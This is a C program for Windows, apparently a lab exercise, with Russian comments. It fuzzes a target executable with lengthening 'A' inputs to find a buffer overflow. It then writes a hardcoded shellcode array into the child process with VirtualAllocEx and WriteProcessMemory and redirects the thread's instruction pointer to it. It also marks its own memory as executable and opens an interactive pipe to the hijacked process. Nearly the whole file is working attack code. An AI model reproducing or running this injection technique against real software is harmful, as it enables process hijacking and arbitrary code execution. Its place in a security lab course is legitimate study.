#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char Shell[100] = "\x48\x83\xEC\x28\x57\x56\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\xB8\x89\x14\x00\x40\x01\x00\x00\x00\xFF\xD0\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5B\x5E\x5F\x48\x83\xC4\x28\xC3";
int readyToIns = 0;
void enable_executable_stack() {
    DWORD old_protect;
    VirtualProtect(
        (void*)&enable_executable_stack,  // Любой адрес в стеке
        4096,                            // Размер региона
        PAGE_EXECUTE_READWRITE,          // Новые права: R+W+X
        &old_protect                     // Старые права (не используется)
    );
}
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        printf("Buffer overflow occurred!\n");
        readyToIns = 1;
        return EXCEPTION_EXECUTE_HANDLER;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int RunExeWithInput(const char* input, const char* exePath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hChildStd_IN_Rd, hChildStd_IN_Wr;
    HANDLE hChildStd_OUT_Rd, hChildStd_OUT_Wr;
    NT_TIB* tib = (NT_TIB*)NtCurrentTeb();
    printf("#Stack base: %p#\n", tib->StackBase);
    printf("#Stack limit: %p#\n", tib->StackLimit);

    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &sa, 0) ||
        !CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &sa, 0)) {
        printf("Error creating pipes: %d\n", GetLastError());
        return -1;
    }

    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hChildStd_IN_Rd;
    si.hStdOutput = hChildStd_OUT_Wr;
    si.hStdError = hChildStd_OUT_Wr;

    char cmdLine[MAX_PATH];
    strcpy(cmdLine, exePath);

    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Error creating process: %d\n", GetLastError());
        return -1;
    }

    CloseHandle(hChildStd_IN_Rd);
    CloseHandle(hChildStd_OUT_Wr);

    printf("Input Data: %s", input);
    printf("!%d!\n", readyToIns);
    if (readyToIns == 1) {
        printf("Injecting shellcode into process...\n");
        
        // 1. Выделяем память в целевом процессе
        void* remoteMemory = VirtualAllocEx(
            pi.hProcess, 
            NULL, 
            sizeof(Shell), 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );
        // 2. Записываем шелл-код
        WriteProcessMemory(pi.hProcess, remoteMemory, Shell, sizeof(Shell), NULL);
        // 3. Перехватываем поток и меняем EIP/RIP
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        SuspendThread(pi.hThread);
    #ifdef _WIN64
        ctx.Rip = (DWORD64)remoteMemory;  // Для x64
    #else
        ctx.Eip = (DWORD)remoteMemory;    // Для x86
    #endif
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        // Чтение вывода дочернего процесса после выполнения шелл-кода
        char buffer[1024];
        DWORD bytesRead = 0;
        DWORD startTime = GetTickCount();
        while (1) {
            BOOL success = ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            printf("Read %d bytes\n", bytesRead);
            
            if (success && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                printf("OUTPUT: %s\n", buffer);
                break;
            }
            
            if (!success) {
                printf("Read error: %d\n", GetLastError());
            }
            
            if (GetTickCount() - startTime > 5000) {
                printf("Timeout reading output.\n");
                break;
            }
            Sleep(100);
        }

        // Переход в интерактивный режим после выполнения шелл-кода
        printf("Shellcode executed. Entering interactive mode...\n");
        char userInput[1024];
        while (1) {
            printf("Enter input (or 'exit' to quit): ");
            fgets(userInput, sizeof(userInput), stdin);

            // Удаление символа новой строки
            userInput[strcspn(userInput, "\n")] = '\0';

            if (strcmp(userInput, "exit") == 0) {
                break;
            }

            // Отправка ввода в дочерний процесс
            DWORD bytesWritten;
            if (!WriteFile(hChildStd_IN_Wr, userInput, strlen(userInput), &bytesWritten, NULL)) {
                printf("Error writing data: %d\n", GetLastError());
                break;
            }

            // Чтение вывода дочернего процесса с таймаутом
            DWORD startTime2 = GetTickCount();
            while (1) {
                BOOL success = ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
                if (success && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    printf("OUTPUT: %s\n", buffer);
                    break;
                }
                if (GetTickCount() - startTime2 > 5000) {  // Таймаут 5 секунд
                    printf("Timeout reading output.\n");
                    break;
                }
                Sleep(100);  // Небольшая задержка для уменьшения нагрузки на CPU
            }
        }
    } else {
        DWORD bytesWritten;
        if (!WriteFile(hChildStd_IN_Wr, input, strlen(input), &bytesWritten, NULL)) {
            printf("Error writing data: %d\n", GetLastError());
            return -1;
        }

        // Чтение вывода дочернего процесса с таймаутом
        char buffer[1024] = {0};
        DWORD bytesRead;
        DWORD startTime = GetTickCount();
        while (1) {
            BOOL success = ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            if (success && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                printf("OUTPUT: %s\n", buffer);
                break;
            }
            if (GetTickCount() - startTime > 5000) {  // Таймаут 5 секунд
                printf("Timeout reading output.\n");
                break;
            }
            Sleep(100);  // Небольшая задержка для уменьшения нагрузки на CPU
        }
    }

    
    // Ожидание завершения дочернего процесса с таймаутом
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        printf("Process is hanging. Terminating...\n");
        TerminateProcess(pi.hProcess, 1);
    }
    
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("Process exited with code: 0x%X\n", exitCode);
    if (exitCode == 0xC0000005) readyToIns = 1;
    CloseHandle(hChildStd_IN_Wr);
    CloseHandle(hChildStd_OUT_Rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return exitCode;
}

int main() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    SetUnhandledExceptionFilter(ExceptionHandler);
    enable_executable_stack();
    char exePath[] = "C:\\Labs\\OiB\\Lab3\\core.exe";
    char inputData[1000] = {0};
    int bufferSize = 0;
    for (int i = 0; i < sizeof(inputData) - 1; i++) {
        printf("==== ATTEMPT TO OVERFLOW BUFFER N' %d ======\n", i + 1);
        inputData[i] = 'A';
        inputData[i + 1] = '\n';
        int exitCode = RunExeWithInput(inputData, exePath);
        if (exitCode == 0xC0000005) {
            printf("BUFFER OVERFLOW DETECTED!\n");
            bufferSize = i + 1;
            printf("BUFFER SIZE: %d\n", bufferSize);
            exitCode = RunExeWithInput(inputData, exePath);
            break;
        }
    }

    return 0;
}